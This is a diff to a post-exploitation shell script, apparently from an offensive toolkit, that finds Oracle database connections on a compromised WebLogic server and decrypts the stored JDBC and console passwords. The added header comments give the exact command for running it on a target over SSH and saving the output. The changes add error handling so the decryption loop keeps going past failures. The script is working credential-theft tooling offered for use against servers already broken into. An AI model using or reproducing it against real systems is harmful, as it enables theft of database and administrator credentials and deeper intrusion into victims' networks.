@@ -1,3 +1,6 @@
+# 后渗透，一键破解weblogic jdbc、console用户名及密码
+# ssh -i YouKey userName@YouTargetIp -p targetPort < oneKeyGetSshWeblogicJdbcPswd.sh >out.txt
+# https://github.com/hktalent/myhktools 
 echo "查找数据库连接"
 netstat -antp|grep ":1521"|grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):1521"|sort -u
 
@@ -29,8 +32,11 @@ def decrypt(domainHomeName, encryptedPwd):
 try:
     if len(sys.argv) == 3:
         a = sys.argv[2].split()
-        for i in range(1, len(a)):
-            decrypt(sys.argv[1], a[i])
+        for i in a:
+            try:
+                decrypt(sys.argv[1], i)
+            except:
+                pass
     else:
         print "INVALID ARGUMENTS"
 except:
@@ -55,7 +61,10 @@ for i in range(1, len(sys.argv)):
    pwd = sys.argv[i]
    # Delete unnecessary escape characters
    preppwd = pwd.replace("\\\\", "")
-   print "Decrypted string is: " + clearOrEncryptService.decrypt(preppwd)
+   try:
+      print "Decrypted string is: " + clearOrEncryptService.decrypt(preppwd)
+   except:
+      pass
 
 EOT
 echo "开始破解weblogic console 用户名及密码"
